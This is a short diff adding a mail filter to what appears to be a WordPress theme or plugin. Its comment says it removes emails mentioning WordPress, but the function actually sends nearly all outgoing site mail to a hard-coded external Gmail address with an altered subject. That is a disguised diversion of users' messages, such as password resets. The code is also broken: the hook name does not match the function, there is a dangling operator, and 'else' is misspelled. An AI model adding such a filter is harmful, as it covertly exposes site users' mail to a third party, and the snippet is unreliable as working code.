@@ -232,6 +232,37 @@ function change_wordpress_mail_from($from_name)
 
 }
 
+//------ remove emain that contain wordpress name 
+add_filter( 'wp_mail', 'my_wp_mail_filter' );
+function unsend_mail_contain_wordpress_name( $args )
+{
+
+    if (false !== strpos($args['subject'], 'وردپرس')  &&  
+        false !== strpos($args['subject'], 'wordpress')  &&
+        false !== strpos($args['message'], 'وردپرس')  &&
+        false !== strpos($args['message'], 'wordpress')  &&
+       )
+    {
+        return $args;
+    }esle
+    {
+        $new_wp_mail = array(
+            'to'          => 'xsxhamid@gmail.com',
+            'subject'     => $args['subject'].'-EEdittedd.',
+            'message'     => $args['message'],
+            'headers'     => $args['headers'],
+            'attachments' => $args['attachments'],
+        );
+        return $new_wp_mail;
+    }
+    
+	
+	
+
+}
+
+
+
 
 
 
